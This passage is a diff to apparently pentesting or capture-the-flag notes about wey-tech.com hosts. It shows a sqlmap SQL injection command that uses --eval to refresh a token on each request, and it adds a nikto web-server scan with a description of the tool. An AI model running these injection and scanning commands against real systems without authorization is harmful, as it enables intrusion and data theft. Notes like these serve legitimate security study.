@@ -25,3 +25,9 @@ If that doesn't work, you may need to use `eval` to write a custom python script
 ```
 sqlmap -u "http://personnel.wey-tech.com/application-check.php?applicantmail=blah&token=M" --eval "import urllib;page = urllib.urlopen('http://personnel.wey-tech.com/validator.php');token = urllib.quote(str(page.read()).decode('utf-8'));print(token)" -p applicantmail -v 1
 ```
+
+### What tool helps detect web server versions and misconfigurations?
+```
+nikto -h http://mail.wey-tech.com
+```
+Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. 
